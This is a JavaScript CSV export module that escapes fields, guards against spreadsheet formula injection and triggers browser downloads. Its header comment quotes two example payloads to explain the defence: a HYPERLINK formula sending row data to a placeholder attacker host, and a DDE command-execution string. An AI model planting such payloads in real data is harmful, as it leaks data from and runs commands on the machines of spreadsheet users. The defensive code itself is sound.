/**
 * csv.js — one correct CSV writer for every export in the app.
 *
 * The exports were each hand-rolled and each wrong in a different way. Some
 * did `row.join(',')` with no escaping at all, so a comma in an address
 * silently shifted every later column; some quoted correctly but none guarded
 * against formula injection.
 *
 * Formula injection: a spreadsheet treats a cell beginning with = + @ - (or a
 * tab/carriage return) as a formula, not text. A customer name stored as
 *   =HYPERLINK("https://evil.example/?"&A1,"Click me")
 * becomes a live link leaking the row's contents when staff open the export;
 * =cmd|'/c calc'!A0 is the DDE variant. The value is attacker-controlled and
 * the code executes in the reader's spreadsheet, not in the app, so no amount
 * of care in the web UI prevents it.
 *
 * Neutralising is done by prefixing a single quote, which spreadsheets read as
 * "the rest is text". Numbers are deliberately exempt: "-100" is a legitimate
 * discount and must stay a number, so a leading "-" is only treated as
 * dangerous when the value is not numeric.
 */

/** Leading characters that make a spreadsheet evaluate a cell. */
const FORMULA_LEAD = /^[=+@\t\r]/;

/** A value that is genuinely a number, including negatives and decimals. */
const NUMERIC = /^-?\d+(\.\d+)?$/;

/**
 * Render one value as a safe CSV field, quoted when it needs to be.
 */
export function csvCell(value) {
  let s = value === null || value === undefined ? '' : String(value);

  // Formula neutralisation, before quoting.
  if (FORMULA_LEAD.test(s) || (s.startsWith('-') && !NUMERIC.test(s))) {
    s = `'${s}`;
  }

  // Standard CSV quoting: double the quotes, wrap if the field contains a
  // delimiter, a quote, or a line break.
  const needsQuotes = /[",\n\r;]/.test(s);
  s = s.replace(/"/g, '""');
  return needsQuotes ? `"${s}"` : s;
}

/**
 * Build a CSV document from a header array and an array of row arrays.
 * Uses CRLF, which is what the format specifies and what Excel expects.
 */
export function toCsv(headers, rows) {
  const lines = [];
  if (headers && headers.length) lines.push(headers.map(csvCell).join(','));
  for (const row of rows) lines.push(row.map(csvCell).join(','));
  return lines.join('\r\n');
}

/**
 * Build the CSV and hand it to the browser as a download.
 * The BOM makes Excel read it as UTF-8, without which Arabic customer names
 * arrive as mojibake.
 */
export function downloadCsv(filename, headers, rows) {
  const csv = toCsv(headers, rows);
  const blob = new Blob(['﻿' + csv], { type: 'text/csv;charset=utf-8;' });
  const url = URL.createObjectURL(blob);
  const a = document.createElement('a');
  a.href = url;
  a.download = filename;
  document.body.appendChild(a);
  a.click();
  document.body.removeChild(a);
  URL.revokeObjectURL(url);
}

/**
 * Hand an already-built CSV string to the browser as a download.
 *
 * downloadCsv covers the common case of one header + one body. A multi-section
 * pack (several titled tables in one file, as the CX monthly pack needs) can't
 * use it, and the alternative was re-implementing the BOM and blob dance at
 * the call site — which is how the per-export drift this module exists to fix
 * started. Build the sections with toCsv, join them, hand the result here.
 */
export function downloadCsvText(filename, csv) {
  const blob = new Blob(['﻿' + csv], { type: 'text/csv;charset=utf-8;' });
  const url = URL.createObjectURL(blob);
  const a = document.createElement('a');
  a.href = url;
  a.download = filename;
  document.body.appendChild(a);
  a.click();
  document.body.removeChild(a);
  URL.revokeObjectURL(url);
}

/** Build rows from objects using an explicit column order. */
export function objectsToCsv(items, columns) {
  return toCsv(
    columns.map(c => c.label),
    items.map(it => columns.map(c => (typeof c.value === 'function' ? c.value(it) : it[c.value])))
  );
}

export default csvCell;
